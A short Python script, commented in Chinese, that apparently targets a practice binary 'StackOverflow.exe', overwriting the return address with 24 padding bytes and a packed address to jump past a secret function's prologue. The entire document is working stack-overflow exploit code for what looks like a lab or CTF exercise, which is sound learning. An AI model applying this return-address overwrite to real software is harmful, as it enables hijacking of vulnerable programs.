import subprocess
import struct

# 原地址是 0x0000000000401090
# 我们跳过第一条指令 'sub rsp, 28' (占用 4 字节)
# 直接跳到 0x0000000000401094
secret_addr_adjusted = 0x0000000000401094

# 保持你原来的 24 字节偏移
padding = b"A" * 24 
rip_overwrite = struct.pack("<Q", secret_addr_adjusted)

payload = padding + rip_overwrite

print(f"尝试跳过函数头，目标地址: {hex(secret_addr_adjusted)}")

p = subprocess.Popen(["StackOverflow.exe"], stdin=subprocess.PIPE)
p.communicate(input=payload)







